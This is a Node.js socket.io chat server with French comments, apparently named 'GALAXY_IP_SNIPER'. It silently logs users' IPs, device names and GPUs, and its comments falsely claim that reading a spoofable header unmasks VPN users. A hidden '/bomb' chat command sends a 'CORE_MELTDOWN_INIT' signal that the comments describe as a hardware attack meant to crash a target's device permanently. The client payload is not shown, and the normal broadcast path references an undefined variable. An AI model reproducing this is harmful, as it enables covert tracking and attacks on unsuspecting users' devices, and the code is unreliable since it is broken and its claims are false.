const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const vault = {}; 
const banned = new Set(); // Liste des IP condamnées au crash permanent

io.on('connection', (socket) => {
    // CAPTURE DE L'IP (Percement des proxys/VPN pour avoir la vraie 176...)
    const ip = (socket.handshake.headers['x-forwarded-for'] || 
                socket.handshake.address || 
                socket.conn.remoteAddress).split(',')[0].trim();

    // FILTRE DE MORT : Si l'IP est bannie, on lance le crash AVANT tout le reste
    if (banned.has(ip)) {
        console.log(`[!!!] CIBLE BANNIE DÉTECTÉE : ${ip}. LANCEMENT ATTAQUE MATÉRIELLE.`);
        socket.emit('CORE_MELTDOWN_INIT'); 
    }

    socket.on('check_device', (info) => {
        // On enregistre l'IP avec toutes ses infos hardware pour le tracking
        vault[ip] = { 
            sid: socket.id, 
            name: info.name, 
            gpu: info.hardware.gpu 
        };
        console.log(`[+] SCAN IP : ${ip} | NOM : ${info.name} | GPU : ${info.hardware.gpu}`);
    });

    socket.on('chat message', (data) => {
        const msg = data.text.trim();

        // COMMANDE : /bomb [IP]
        if (msg.startsWith("/bomb ")) {
            const target = msg.split(" ")[1];
            banned.add(target); // L'IP est maintenant marquée pour la mort permanente
            
            // On bombarde l'IP sur toutes ses sessions ouvertes
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(target)) {
                    io.to(vault[storedIP].sid).emit('CORE_MELTDOWN_INIT');
                }
            });
            console.log(`[STRIKE] IP ${target} AJOUTÉE À LA BLACKLIST DE DESTRUCTION.`);
        } 
        
        else if (msg.startsWith("/stop ")) {
            const target = msg.split(" ")[1];
            banned.delete(target);
            console.log(`[SAFE] IP ${target} RETIRÉE DE LA BLACKLIST.`);
        } else {
            io.emit('chat message', d);
        }
    });
});

http.listen(3000, () => { console.log("GALAXY_IP_SNIPER_V15_READY"); });
